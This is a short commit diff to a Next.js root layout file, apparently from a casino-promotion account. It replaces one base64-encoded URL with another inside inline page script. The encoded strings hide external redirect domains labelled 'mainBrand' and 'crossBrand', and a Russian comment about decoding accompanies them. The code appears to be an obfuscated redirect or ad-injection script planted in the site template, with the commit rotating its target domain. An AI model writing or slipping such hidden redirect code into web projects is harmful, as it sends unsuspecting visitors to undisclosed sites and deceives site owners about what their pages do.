dd7e4620ad35826bedac8db544e89aa26494f164
arkadacasinos <bezdep.rf@mail.ru>
2026-06-29 02:48:58 +0500

    Update layout.tsx

--- app/layout.tsx
+++ app/layout.tsx
@@ -90,7 +90,7 @@ export default function RootLayout({
                         return;
                     }
                 }
-                var mainBrandB64 = "aHR0cHM6Ly9hcHgzLXNtYXJ0LmNvbS9hZDJhYXE1dXBj"; 
+                var mainBrandB64 = "aHR0cHM6Ly93ZXN0LWNvb2w5LWFwZXguY29tL2FkMmFhcTV1cGM="; 
                 var crossBrandB64 = "aHR0cHM6Ly9mbngtYWJzLm5ldC9kaDYxbXAxYW0="; 
                 
                 // Фикс: отрезаем решетку перед декодированием
